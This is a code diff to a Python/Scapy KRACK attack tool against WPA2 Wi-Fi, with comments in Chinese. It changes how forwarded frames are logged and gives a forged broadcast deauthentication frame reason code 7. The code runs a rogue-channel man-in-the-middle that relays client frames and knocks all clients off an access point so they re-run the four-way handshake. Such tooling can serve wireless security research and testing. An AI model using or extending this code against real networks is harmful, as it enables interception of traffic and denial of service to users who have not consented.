@@ -656,31 +656,27 @@ class KRAckAttack():
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
-			# 需要特別注意 Deauth and Disassoc frames
-			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# print 所有轉送的封包
-			elif self.clientmac is not None and self.clientmac == p.addr1:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			elif might_forward:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
-
 			if might_forward:
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
 					# !-- CHECK[y]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
 					# !-- CHECK[ ]: time out problem?
 					if self.handle_to_client_pairwise(client, p):
+						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
 					elif self.handle_to_client_groupkey(client, p):
+						print_rx(DEBUG, "Real channel ", p, suffix=" -- MitM'ing pass forward !!")
 						pass
 					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
+						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 						self.sock_rogue.send(p)
 					else:
+						print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 						self.sock_rogue.send(p)
 				# Group addressed frames
 				else:
+					print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 					self.sock_rogue.send(p)
 
 		# 3. Always display all frames sent by or to the targeted client
@@ -859,7 +855,7 @@ class KRAckAttack():
 
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
 		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
-		deauth = RadioTap()/dot11/Dot11Deauth()
+		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
 		self.sock_real.send(deauth)
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
